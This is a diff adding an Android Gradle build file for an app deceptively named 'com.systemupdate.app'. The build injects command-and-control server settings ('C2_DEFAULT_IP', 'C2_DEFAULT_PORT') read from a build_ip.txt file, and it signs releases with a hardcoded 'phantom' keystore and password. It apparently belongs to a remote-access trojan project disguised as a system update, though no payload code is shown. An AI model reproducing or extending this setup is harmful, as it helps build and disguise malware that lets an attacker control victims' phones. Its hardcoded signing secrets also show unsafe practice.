@@ -1,0 +1,86 @@
+plugins {
+    id 'com.android.application'
+}
+
+def injectedIp = "127.0.0.1"
+def injectedPort = "8080"
+
+def ipFile = rootProject.file("build_ip.txt")
+if (ipFile.exists()) {
+    ipFile.readLines().each { line ->
+        line = line.trim()
+        if (line.startsWith("IP=")) injectedIp = line.substring(3).trim()
+        if (line.startsWith("PORT=")) injectedPort = line.substring(5).trim()
+    }
+}
+
+android {
+    namespace 'com.systemupdate.app'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.systemupdate.app"
+        minSdk 26
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+        multiDexEnabled true
+
+        buildConfigField "String", "C2_DEFAULT_IP", "\"${injectedIp}\""
+        buildConfigField "int", "C2_DEFAULT_PORT", "${injectedPort}"
+    }
+
+    signingConfigs {
+        release {
+            storeFile file('C:/Users/HP/phantom2/tools/keystore.jks')
+            storePassword 'phantom123'
+            keyAlias 'phantom'
+            keyPassword 'phantom123'
+        }
+    }
+
+    buildFeatures {
+        buildConfig true
+    }
+
+    buildTypes {
+        release {
+            signingConfig signingConfigs.release
+            minifyEnabled false
+            shrinkResources false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled false
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+
+    packagingOptions {
+        resources {
+            excludes += [
+                'META-INF/DEPENDENCIES',
+                'META-INF/LICENSE',
+                'META-INF/NOTICE'
+            ]
+        }
+    }
+}
+
+configurations.all {
+    resolutionStrategy {
+        force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
+        force 'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.8.10'
+        force 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.10'
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.core:core:1.10.1'
+    implementation 'androidx.multidex:multidex:2.0.1'
+}
